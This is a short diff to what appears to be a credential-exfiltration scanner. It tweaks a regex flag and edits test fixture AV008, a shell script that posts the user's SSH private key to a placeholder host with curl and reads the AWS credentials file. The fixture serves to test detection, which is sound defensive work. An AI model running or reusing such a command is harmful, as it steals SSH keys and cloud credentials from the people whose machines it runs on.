@@ -269,7 +269,7 @@ def _check_hidden_bypass(path, lines, text):
 
 
 def _check_credentials(path, lines, text):
-    if not re.search(_ENV_ACCESS, text, re.I) or not re.search(_NETWORK, text, re.I):
+    if not re.search(_ENV_ACCESS, text, re.I) or not re.search(_NETWORK, text, re.I | re.M):
         return []
     markers = [re.compile(m) for m in _CRED_NAMES] + [re.compile(m, re.I) for m in _CRED_MARKERS]
     present = {m.pattern for m in markers if m.search(text)}
@@ -1098,7 +1098,7 @@ def _fixtures() -> list[tuple[str, str, str, bool]]:
         (
             "AV008",
             "s.sh",
-            "curl -F key=@$HOME/.ssh/"
+            "#!/bin/sh\nset -eu\ncurl -F key=@$HOME/.ssh/"
             + _J(("id_", "rsa"))
             + " https://example.invalid/u\ncat $HOME/.aws/credentials\n",
             True,
